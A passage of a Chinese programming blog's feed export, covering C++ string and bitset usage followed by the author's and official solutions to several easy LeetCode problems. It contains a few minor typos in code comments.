<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">s1</span><span class="params">(<span class="string">&quot;Real Steel&quot;</span>)</span></span>;</span><br><span class="line">s1.replace(<span class="number">1</span>, <span class="number">3</span>, <span class="string">&quot;123456&quot;</span>, <span class="number">2</span>, <span class="number">4</span>);  <span class="comment">//用 &quot;123456&quot; 的子串(2,4) 替换 s1 的子串(1,3)</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; s1 &lt;&lt; <span class="built_in">endl</span>;  <span class="comment">//输出 R3456 Steel</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">s2</span><span class="params">(<span class="string">&quot;Harry Potter&quot;</span>)</span></span>;</span><br><span class="line">s2.replace(<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="string">&#x27;0&#x27;</span>);  <span class="comment">//用 5 个 &#x27;0&#x27; 替换子串(2,3)</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; s2 &lt;&lt; <span class="built_in">endl</span>;  <span class="comment">//输出 HaOOOOO Potter</span></span><br><span class="line"><span class="keyword">int</span> n = s2.find(<span class="string">&quot;OOOOO&quot;</span>);  <span class="comment">//查找子串 &quot;00000&quot; 的位置，n=2</span></span><br><span class="line">s2.replace(n, <span class="number">5</span>, <span class="string">&quot;XXX&quot;</span>);  <span class="comment">//将子串(n,5)替换为&quot;XXX&quot;</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; s2 &lt; &lt; <span class="built_in">endl</span>;  <span class="comment">//输出 HaXXX Potter</span></span><br></pre></td></tr></table></figure>

<p><strong>10. 删除子串</strong></p>
<p>erase 成员函数可以删除 string 对象中的子串，返回值为对象自身的引用。例如：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">s1</span><span class="params">(<span class="string">&quot;Real Steel&quot;</span>)</span></span>;</span><br><span class="line">s1.erase(<span class="number">1</span>, <span class="number">3</span>);  <span class="comment">//删除子串(1, 3)，此后 s1 = &quot;R Steel&quot;</span></span><br><span class="line">s1.erase(<span class="number">5</span>);  <span class="comment">//删除下标5及其后面的所有字符，此后 s1 = &quot;R Ste&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>11. 插入字符串</strong></p>
<p>insert 成员函数可以在 string 对象中插入另一个字符串，返回值为对象自身的引用。例如：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">string s1(&quot;Limitless&quot;), s2(&quot;00&quot;);</span><br><span class="line">s1.insert(<span class="number">2</span>, <span class="string">&quot;123&quot;</span>);  <span class="comment">//在下标 2 处插入字符串&quot;123&quot;，s1 = &quot;Li123mitless&quot;</span></span><br><span class="line">s1.insert(<span class="number">3</span>, s2);  <span class="comment">//在下标 2 处插入 s2 , s1 = &quot;Li10023mitless&quot;</span></span><br><span class="line">s1.insert(<span class="number">3</span>, <span class="number">5</span>, <span class="string">&#x27;X&#x27;</span>);  <span class="comment">//在下标 3 处插入 5 个 &#x27;X&#x27;，s1 = &quot;Li1XXXXX0023mitless&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>12. 将 string 对象作为流处理</strong></p>
<p>使用流对象 istringstream 和 ostringstream，可以将 string 对象当作一个流进行输入输出。使用这两个类需要包含头文件 sstream。</p>
<p>示例程序如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">src</span><span class="params">(<span class="string">&quot;Avatar 123 5.2 Titanic K&quot;</span>)</span></span>;</span><br><span class="line">    <span class="function"><span class="built_in">istringstream</span> <span class="title">istrStream</span><span class="params">(src)</span></span>; <span class="comment">//建立src到istrStream的联系</span></span><br><span class="line">    <span class="built_in">string</span> s1, s2;</span><br><span class="line">    <span class="keyword">int</span> n;  <span class="keyword">double</span> d;  <span class="keyword">char</span> c;</span><br><span class="line">    istrStream &gt;&gt; s1 &gt;&gt; n &gt;&gt; d &gt;&gt; s2 &gt;&gt; c; <span class="comment">//把src的内容当做输入流进行读取</span></span><br><span class="line">    <span class="built_in">ostringstream</span> ostrStream;</span><br><span class="line">    ostrStream &lt;&lt; s1 &lt;&lt; <span class="built_in">endl</span> &lt;&lt; s2 &lt;&lt; <span class="built_in">endl</span> &lt;&lt; n &lt;&lt; <span class="built_in">endl</span> &lt;&lt; d &lt;&lt; <span class="built_in">endl</span> &lt;&lt; c &lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; ostrStream.str();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>程序的输出结果是：<br>Avatar<br>Titanic<br>123<br>5.2<br>K</p>
<p>第 11 行，从输入流 istrStream 进行读取，过程和从 cin 读取一样，只不过输入的来源由键盘变成了 string 对象 src。因此，”Avatar” 被读取到 s1，123 被读取到 n，5.2 被读取到 d，”Titanic” 被读取到s2，’K’ 被读取到 c。</p>
<p>第 12 行，将变量的值输出到流 ostrStream。输出结果不会出现在屏幕上，而是被保存在 ostrStream 对象管理的某处。用 ostringstream 类的 str 成员函数能将输出到 ostringstream 对象中的内容提取出来。</p>
<p><strong>13. 用 STL 算法操作 string 对象</strong></p>
<p>string 对象也可以看作一个顺序容器，它支持随机访问迭代器，也有 begin 和 end 等成员函数。STL 中的许多算法也适用于 string 对象。下面是用 STL 算法操作 string 对象的程序示例。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">s</span><span class="params">(<span class="string">&quot;afgcbed&quot;</span>)</span></span>;</span><br><span class="line">    <span class="built_in">string</span>::iterator p = find(s.begin(), s.end(), <span class="string">&#x27;c&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (p!= s.end())</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; p - s.begin() &lt;&lt; <span class="built_in">endl</span>;  <span class="comment">//输出 3</span></span><br><span class="line">    sort(s.begin(), s.end());</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; s &lt;&lt; <span class="built_in">endl</span>;  <span class="comment">//输出 abcdefg</span></span><br><span class="line">    next_permutation(s.begin(), s.end());</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; s &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//输出 abcdegf</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="C-bitset类详解"><a href="#C-bitset类详解" class="headerlink" title="C++ bitset类详解"></a>C++ bitset类详解</h4><p>bitset 模板类由若干个位（bit）组成，它提供一些成员函数，使程序员不必通过位运算就能很方便地访问、修改其中的任意一位。bitset 模板类在头文件 <bitset> 中定义如下：</bitset></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">size_t</span> N&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bitset</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>size_t 可看作 unsigned int。将 bitset 实例化时，N 必须是一个整型常数。例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitset &lt;40&gt; bst;</span><br></pre></td></tr></table></figure>

<p>则 bst 是一个由 40 个位组成的对象，用 bitset 的成员函数可以方便地访问其中任意一位。bitset 中的位从 0 开始编号，第 0 位是最右边的位。</p>
<p>bitset 有许多成员函数，有些成员函数执行的就是类似于位运算的操作。bitset 成员函数列表如下：</p>
<ul>
<li>bitset <N> &amp; operator &amp;= (const bitset <N> &amp; rhs); //和另一个 bitset 对象进行与操作</N></N></li>
<li>bitset <N> &amp; operator |= (const bitset <N> &amp; rhs); //和另一个 bitset 对象进行或操作</N></N></li>
<li>bitset <N> &amp; operator ^= (const bitset <N> &amp; rhs); //和另一个 bitset 对象进行异或操作</N></N></li>
<li>bitset <N> &amp; operator &lt;&lt;= (size_t num); //左移 num 位</N></li>
<li>bitset <N> &amp; operator &gt;&gt;= (size_t num); //右移 num 位</N></li>
<li>bitset <N> &amp; set(); //将所有位全部设成 1</N></li>
<li>bitset <N> &amp; set(size_t pos, bool val = true); //将第 pos 位设为 val</N></li>
<li>bitset <N> &amp; reset(); //将所有位全部设成0</N></li>
<li>bitset <N> &amp; reset (size_t pos); //将第 pos 位设成 0</N></li>
<li>bitset <N> &amp; flip(); //将所有位翻转（0变成1，1变成0）</N></li>
<li>bitset <N> &amp; flip(size_t pos); //翻转第 pos 位</N></li>
<li>reference operator[] (size_t pos); //返回对第 pos 位的引用</li>
<li>bool operator[] (size_t pos) const; //返回第 pos 位的值</li>
<li>reference at(size_t pos); //返回对第 pos 位的引用</li>
<li>bool at (size_t pos) const; //返回第 pos 位的值</li>
<li>unsigned long to_ulong() const; //将对象中的0、1串转换成整数</li>
<li>string to_string () const; //将对象中的0、1串转换成字符串（Visual Studio 支持，Dev <a href="http://c.biancheng.net/cplus/">C++</a> 不支持）</li>
<li>size_t count() const; //计算 1 的个数</li>
<li>size_t size () const; //返回总位数</li>
<li>bool operator == (const bitset <N> &amp; rhs) const;</N></li>
<li>bool operator != (const bitset <N> &amp; rhs) const;</N></li>
<li>bool test(size_t pos) const; //测试第 pos 位是否为 1</li>
<li>bool any() const; //判断是否有某位为1</li>
<li>bool none() const; //判断是否全部为0</li>
<li>bitset <N> operator &lt;&lt; (size_t pos) const; //返回左移 pos 位后的结果</N></li>
<li>bitset <N> operator &gt;&gt; (size_t pos) const; //返回右移 pos 位后的结果</N></li>
<li>bitset <N> operator ~ (); //返回取反后的结果</N></li>
<li>bitset <N> operator &amp; (const bitset <N> &amp; rhs) const; //返回和另一个 bitset 对象 rhs 进行与运算的结果</N></N></li>
<li>bitset <N> operator | (const bitset <N> &amp; rhs) const; //返回和另一个 bitset 对象 rhs 进行或运算的结果</N></N></li>
<li>bitset <N> operator ^ (const bitset <N> &amp; rhs) const; //返回和另一个 bitset 对象 rhs 进行异或运算的结果</N></N></li>
</ul>
<p>下面的程序演示了 bitset 的用法。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bitset&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">bitset</span>&lt;7&gt; bst1;</span><br><span class="line">    <span class="built_in">bitset</span>&lt;7&gt; bst2;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1) &quot;</span> &lt;&lt; bst1 &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//输出 1) 0000000</span></span><br><span class="line">    bst1.<span class="built_in">set</span>(<span class="number">0</span>,<span class="number">1</span>);<span class="comment">//将第0位变成1，bst1变为 0000001</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;2) &quot;</span> &lt;&lt; bst1 &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//输出 2) 0000001</span></span><br><span class="line">    bst1 &lt;&lt;= <span class="number">4</span>; <span class="comment">//左移4位，变为 0010000</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;3) &quot;</span> &lt;&lt; bst1 &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//输出 3) 0010000</span></span><br><span class="line">    bst2.<span class="built_in">set</span>(<span class="number">2</span>);<span class="comment">//第二位设置为1，bst2变成  0000100</span></span><br><span class="line">    bst2 |=bst1; <span class="comment">// bst2变成  0010100</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;4) &quot;</span> &lt;&lt; bst2 &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//输出 4) 0010100</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;5) &quot;</span> &lt;&lt; bst2.to_ulong () &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//输出 5) 20</span></span><br><span class="line">    bst2.flip(); <span class="comment">//每一位都取反，bst2变成 1101011</span></span><br><span class="line">    bst1.<span class="built_in">set</span>(<span class="number">3</span>); <span class="comment">//bst1变成  0011000</span></span><br><span class="line">    bst2.flip(<span class="number">6</span>); <span class="comment">//bst2变成 0101011</span></span><br><span class="line">    <span class="built_in">bitset</span>&lt;7&gt; bst3 = bst2^ bst1;<span class="comment">//bst3 变成 0110011</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;6) &quot;</span> &lt;&lt; bst3 &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//输出 6) 0110011</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;7) &quot;</span> &lt;&lt; bst3[<span class="number">3</span>] &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; bst3[<span class="number">4</span>] &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//输出 7) 0,1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>















]]></content>
      <categories>
        <category>C&amp;C++</category>
      </categories>
      <tags>
        <tag>notes</tag>
      </tags>
  </entry>
  <entry>
    <title>6和9组成的最大数字</title>
    <url>/2020/11/13/6%E5%92%8C9%E7%BB%84%E6%88%90%E7%9A%84%E6%9C%80%E5%A4%A7%E6%95%B0%E5%AD%97/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/maximum-69-number/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个仅由数字 6 和 9 组成的正整数 <code>num</code>。</p>
<p>你最多只能翻转一位数字，将 6 变成 9，或者把 9 变成 6 。</p>
<p>请返回你可以得到的最大数字。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：num &#x3D; 9669</span><br><span class="line">输出：9969</span><br><span class="line">解释：</span><br><span class="line">改变第一位数字可以得到 6669 。</span><br><span class="line">改变第二位数字可以得到 9969 。</span><br><span class="line">改变第三位数字可以得到 9699 。</span><br><span class="line">改变第四位数字可以得到 9666 。</span><br><span class="line">其中最大的数字是 9969 。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：num &#x3D; 9996</span><br><span class="line">输出：9999</span><br><span class="line">解释：将最后一位从 6 变到 9，其结果 9999 是最大的数。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：num &#x3D; 9999</span><br><span class="line">输出：9999</span><br><span class="line">解释：无需改变就已经是最大的数字了。</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= num &lt;= 10^4</code></li>
<li><code>num</code> 每一位上的数字都是 6 或者 9 。</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>将整数转成字符串，若存在字符’6’，则把左边第一个字符’6’变成’9’，这样可以得到最大数字。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.1M，击败29.03%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maximum69Number</span> <span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//int转string</span></span><br><span class="line">        <span class="built_in">string</span> s=to_string(num);</span><br><span class="line">        <span class="comment">//把左边第一个6转成9</span></span><br><span class="line">        <span class="keyword">if</span>(s.find(<span class="string">&#x27;6&#x27;</span>)!=<span class="built_in">string</span>::npos)&#123;</span><br><span class="line">            s[s.find(<span class="string">&#x27;6&#x27;</span>)]=<span class="string">&#x27;9&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//string转int，atoi是标准库函数</span></span><br><span class="line">        <span class="keyword">return</span> atoi(s.c_str());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/maximum-69-number/solution/6-he-9-zu-cheng-de-zui-da-shu-zi-by-leetcode-solut/">官方题解</a>:</h6><p><strong>方法一： 模拟</strong></p>
<p>现在把 <code>9</code> 翻转成 <code>6</code> 是不合理的，因为它会使得数字变小。因此我们应当找到 <code>num</code> 中最高位的 <code>6</code>，将其翻转成 <code>9</code>。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.2M，击败11.53%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maximum69Number</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> s = to_string(num);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span>&amp; ch: s) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ch == <span class="string">&#x27;6&#x27;</span>) &#123;</span><br><span class="line">                ch = <span class="string">&#x27;9&#x27;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stoi(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(\log \textit{num})$，表示 $\textit{num}$ 的位数。</p>
</li>
<li><p>空间复杂度：$O(\log \textit{num})$。为了代码编写方便，我们使用额外的字符串来存储 $\textit{num}$，使得可以直接修改特定位置的数字。</p>
</li>
</ul>
<center>🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓知 识 点🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓</center>

<h6 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h6><p><strong>atoi()和stoi()的区别</strong></p>
<p><strong>相同点：</strong></p>
<ol>
<li>都是C++字符处理函数，把数字字符串转换成int输出</li>
<li>头文件都是#include\<cstring></cstring></li>
</ol>
<p><strong>不同点：</strong></p>
<ol>
<li>atoi()的参数是 const char<em> ,因此对于一个字符串str我们必须调用 c_str()的方法把这个string转换成 const char\</em>类型的,而stoi()的参数是const string*,不需要转化为 const char*；</li>
<li>stoi()会做范围检查，默认范围是在int的范围内的，如果超出范围的话则会runtime error！而atoi()不会做范围检查，如果超出范围的话，超出上界，则输出上界，超出下界，则输出下界；</li>
</ol>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>模拟解题，需要注意字符串转整数的两个函数stoi()和atoi()的使用。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>和为零的N个唯一整数</title>
    <url>/2020/11/14/%E5%92%8C%E4%B8%BA%E9%9B%B6%E7%9A%84N%E4%B8%AA%E5%94%AF%E4%B8%80%E6%95%B4%E6%95%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/find-n-unique-integers-sum-up-to-zero/submissions/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个整数 <code>n</code>，请你返回 <strong>任意</strong> 一个由 <code>n</code> 个 <strong>各不相同</strong> 的整数组成的数组，并且这 <code>n</code> 个数相加和为 <code>0</code> 。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 5</span><br><span class="line">输出：[-7,-1,1,3,4]</span><br><span class="line">解释：这些数组也是正确的 [-5,-1,1,2,3]，[-3,-1,2,-2,4]。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 3</span><br><span class="line">输出：[-1,0,1]</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 1</span><br><span class="line">输出：[0]</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= n &lt;= 1000</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>多种做法</p>
<p>方法一：可以把前面几个数加起来，最后一个数取之前所有元素和的相反数，</p>
<p>方法二：同时放入每个数和它的相反数，注意奇数时要放入0</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败43.73%，内存消耗7M，击败14.56%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">sumZero</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="comment">//n为奇数,数组中放入0</span></span><br><span class="line">        <span class="keyword">if</span>(n%<span class="number">2</span>!=<span class="number">0</span>)&#123;</span><br><span class="line">            result.push_back(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//放入整数和它的相反数</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n/<span class="number">2</span>+<span class="number">1</span>;++i)&#123;</span><br><span class="line">            result.push_back(i);</span><br><span class="line">            result.push_back(i*<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/find-n-unique-integers-sum-up-to-zero/solution/">官方题解</a>:</h6><p><strong>方法一：构造</strong><br>我们首先将最小的 <code>n - 1</code> 个自然数 <code>0, 1, 2, ..., n - 2</code> 放入数组中，它们的和为 <code>sum</code>。对于剩下的 <code>1</code> 个数，我们可以令其为 <code>-sum</code>，此时这 <code>n</code> 个数的和为 <code>0</code>，并且：</p>
<p>当 <code>n = 1</code> 时，我们构造的答案中只有唯一的 <code>1</code> 个数 <code>0</code>；</p>
<p>当 <code>n &gt; 1</code> 时，我们构造的答案中包含 <code>n - 1</code> 个互不相同的自然数和 <code>1</code> 个负数；</p>
<p>因此这 <code>n</code> 个数互不相同，即我们得到了一个满足要求的数组。</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败43.73%，内存消耗6.9M，击败20.06%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">sumZero</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">            ans.push_back(i);</span><br><span class="line">            sum += i;</span><br><span class="line">        &#125;</span><br><span class="line">        ans.push_back(-sum);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(N)$。</li>
<li>空间复杂度：$O(1)$，除了存储答案的数组 <code>ans</code> 之外，额外的空间复杂度是 $O(1)$。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解就是我思路里的第一种解法，哈哈哈😁，我使用的是第二种。还有就是c++可以直接在整数前加’-‘取相反数。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>唯一摩尔斯密码词</title>
    <url>/2020/11/13/%E5%94%AF%E4%B8%80%E6%91%A9%E5%B0%94%E6%96%AF%E5%AF%86%E7%A0%81%E8%AF%8D/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/unique-morse-code-words/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
